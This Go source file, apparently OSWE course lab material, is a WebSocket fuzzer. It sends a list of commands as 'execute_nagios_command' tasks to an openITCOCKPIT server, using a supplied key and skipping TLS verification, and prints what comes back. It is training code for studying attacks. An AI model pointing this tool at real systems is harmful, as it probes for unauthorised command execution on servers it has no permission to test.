package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/tidwall/gjson"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Chp 10.7.4.2 - WebSocket command fuzzer

var index = 0
var commands []string

var done chan interface{}
var interrupt chan os.Signal
var uniqid string
var key *string

// go func that continuously reads messages and then prints the contents
func messageHandlerFuzzer(connection *websocket.Conn) {
	defer close(done)
	for {
		_, msg, err := connection.ReadMessage()
		if err != nil {
			log.Println("Error when receiving: ", err)
			return
		}

		// on_message: process our message here by loading the json
		msgString := string(msg)
		temp := gjson.Get(msgString, "uniqid").String()
		if temp != "" {
			uniqid = temp
		}

		msgType := gjson.Get(msgString, "type").String()
		if msgType == "connection" {
			utils.PrintSuccess("Connected!")
		} else if msgType == "dispatcher" {
			continue
		} else if msgType == "response" {
			utils.PrintInfo(gjson.Get(msgString, "payload").String())
		} else {
			utils.PrintInfo(msgString)
		}
	}
}

// obtains commands from file and prepares array for reading in main
func prepareFuzzList() {
	file, err := os.Open("commands.txt")
	if err != nil {
		log.Fatalln("Failed to open commands.txt: ", err)
	}
	fileScanner := bufio.NewScanner(file)

	fileScanner.Split(bufio.ScanLines)

	for fileScanner.Scan() {
		commands = append(commands, strings.TrimSpace(fileScanner.Text()))
	}

	log.Println(commands)
}

func toJsonFuzzer(task, data string) []byte {
	request := map[string]string{
		"task":   task,
		"data":   data,
		"uniqid": uniqid,
		"key":    *key,
	}

	msg, err := json.Marshal(request)
	if err != nil {
		log.Println("Failed to marshal JSON: ", err)
	}

	utils.PrintInfo("Marshalled JSON: " + string(msg))
	return msg
}

func main() {
	done = make(chan interface{})

	interrupt = make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	addr := flag.String("url", "", "WebSocket addr")
	key = flag.String("key", "", "openITCOCKPIT key")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) != 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s -url=<WS URL> -key=<openITCOCKPIT WS Key>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s -url=wss://192.168.249.129/sudo_server -key=1fea123e07f730f76e661bced33a94152378611e", os.Args[0]))
		os.Exit(1)
	}

	u, err := url.Parse(*addr)
	if err != nil {
		log.Fatalln("Failed to parse URL: ", err)
	}
	wsHeaders := http.Header{}
	dialer := websocket.DefaultDialer
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	utils.PrintInfo("Connecting to: " + u.String())
	conn, _, err := dialer.Dial(u.String(), wsHeaders)
	if err != nil {
		log.Fatalln("dial: ", err)
	}
	defer conn.Close()

	go messageHandlerFuzzer(conn)
	prepareFuzzList()

fuzzerLogic:
	for {
		select {
		// after 2 seconds: get new command, convert to json and send to server
		case <-time.After(time.Duration(2) * time.Second):
			if index == len(commands) {
				break fuzzerLogic
			}

			cmd := commands[index]
			utils.PrintInfo("Testing: " + cmd)
			msg := toJsonFuzzer("execute_nagios_command", cmd)
			err = conn.WriteMessage(websocket.TextMessage, msg)
			if err != nil {
				log.Println("Error when writing: ", err)
				return
			}

			index++

		// received SIGINT, terminate gracefully and close connections
		case <-interrupt:
			utils.PrintInfo("Received SIGINT, closing connections...")
			err = conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("Error during closing websocket: ", err)
				return
			}

			select {
			// if messageHandler exits, then the 'done' channel will close
			case <-done:
				utils.PrintInfo("Receiving channel closed, exiting...")
			// otherwise, we will wait for 1s and then exit
			case <-time.After(time.Duration(1) * time.Second):
				utils.PrintInfo("Timeout in closing receiving channel. Exiting....")
			}
			return
		}
	}

	utils.PrintSuccess("Done!")
}
